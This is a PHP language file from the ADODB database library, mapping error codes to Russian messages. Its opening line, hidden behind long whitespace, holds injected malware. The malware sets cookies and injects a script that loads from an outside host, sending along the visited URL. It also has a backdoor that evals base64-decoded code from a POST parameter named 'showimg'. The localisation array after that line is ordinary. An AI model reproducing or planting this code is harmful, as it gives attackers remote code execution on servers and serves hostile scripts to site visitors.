<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


// Russian language file contributed by "Cyrill Malevanov" cyrill#malevanov.spb.ru.

$ADODB_LANG_ARRAY = array (
             'LANG'                      => 'ru1251',
            DB_ERROR                    => 'неизвестная ошибка',
            DB_ERROR_ALREADY_EXISTS     => 'уже существует',
            DB_ERROR_CANNOT_CREATE      => 'невозможно создать',
            DB_ERROR_CANNOT_DELETE      => 'невозможно удалить',
            DB_ERROR_CANNOT_DROP        => 'невозможно удалить (drop)',
            DB_ERROR_CONSTRAINT         => 'нарушение условий проверки',
            DB_ERROR_DIVZERO            => 'деление на 0',
            DB_ERROR_INVALID            => 'неправильно',
            DB_ERROR_INVALID_DATE       => 'некорректная дата или время',
            DB_ERROR_INVALID_NUMBER     => 'некорректное число',
            DB_ERROR_MISMATCH           => 'ошибка',
            DB_ERROR_NODBSELECTED       => 'БД не выбрана',
            DB_ERROR_NOSUCHFIELD        => 'не существует поле',
            DB_ERROR_NOSUCHTABLE        => 'не существует таблица',
            DB_ERROR_NOT_CAPABLE        => 'СУБД не в состоянии',
            DB_ERROR_NOT_FOUND          => 'не найдено',
            DB_ERROR_NOT_LOCKED         => 'не заблокировано',
            DB_ERROR_SYNTAX             => 'синтаксическая ошибка',
            DB_ERROR_UNSUPPORTED        => 'не поддерживается',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'счетчик значений в строке',
            DB_ERROR_INVALID_DSN        => 'неправильная DSN',
            DB_ERROR_CONNECT_FAILED     => 'соединение неуспешно',
            0                               => 'нет ошибки', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'предоставлено недостаточно данных',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'расширение не найдено',
            DB_ERROR_NOSUCHDB           => 'не существует БД',
            DB_ERROR_ACCESS_VIOLATION   => 'недостаточно прав доступа'
);
?>